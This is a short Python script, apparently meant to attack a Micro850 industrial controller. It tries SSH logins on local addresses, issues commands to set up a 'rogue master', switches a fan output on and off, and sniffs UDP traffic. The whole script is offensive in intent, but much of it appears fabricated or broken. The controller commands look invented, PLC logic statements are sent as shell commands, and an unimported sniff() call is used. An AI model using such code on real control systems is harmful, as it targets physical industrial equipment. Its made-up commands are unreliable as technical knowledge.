import paramiko
import re
import scapy.all as scapy
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether
import socket
import netifaces as ni
import time

def find_plc_ip():
    # List of possible PLC IP addresses
    possible_ips = ['192.168.1.1', '192.168.1.2']

    # Iterate over each possible IP address
    for ip in possible_ips:
        # Try to establish a connection to the PLC
        try:
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(ip, username='your_username', password='your_password')
            print(f"PLC IP address found: {ip}")
            return ip
        except paramiko.AuthenticationException:
            print(f"Authentication failed for IP address {ip}")
        except paramiko.SSHException:
            print(f"Connection failed for IP address {ip}")

def get_plc_ip():
    # Use the Micro850's built-in function to get its IP address
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect('192.168.1.1', username='your_username', password='your_password')
    stdin, stdout, stderr = ssh.exec_command('micro850.rpt.getipaddress')
    ip_address = stdout.read().decode().strip()
    print(f"PLC IP address: {ip_address}")
    return ip_address

def setup_rogue_master(ip_address):
    # Set up a rogue master by creating a new connection to the PLC
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip_address, username='your_username', password='your_password')

    # Change the PLC's configuration to make it act as a rogue master
    stdin, stdout, stderr = ssh.exec_command('micro850.rpt.setconfig 1')
    print(stdout.read().decode().strip())

    # Set up a new connection to the PLC using the rogue master configuration
    stdin, stdout, stderr = ssh.exec_command('micro850.rpt.connect')
    print(stdout.read().decode().strip())

def send_command(ip_address):
    # Send a command message to the fan
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    ssh.connect(ip_address, username='your_username', password='your_password')

    # Set the fan to ON
    stdin, stdout, stderr = ssh.exec_command('Activate_FanA := TRUE')
    print(stdout.read().decode().strip())

    # Wait for 10 seconds
    time.sleep(10)

    # Set the fan to OFF
    stdin, stdout, stderr = ssh.exec_command('Activate_FanA := FALSE')
    print(stdout.read().decode().strip())

def sniff_network_traffic(ip_address):
    # Use Scapy to sniff and capture network traffic
    sniff(iface='eth0', filter='udp port 1700', prn=lambda x: print(x.summary()))

def main():
    ip_address = find_plc_ip()
    if ip_address is None:
        ip_address = get_plc_ip()

    print(f"Setting up rogue master on IP address {ip_address}")
    setup_rogue_master(ip_address)

    print(f"Sending command to fan on IP address {ip_address}")
    send_command(ip_address)

    print(f"Sniffing network traffic on IP address {ip_address}")
    sniff_network_traffic(ip_address)

if __name__ == "__main__":
    main()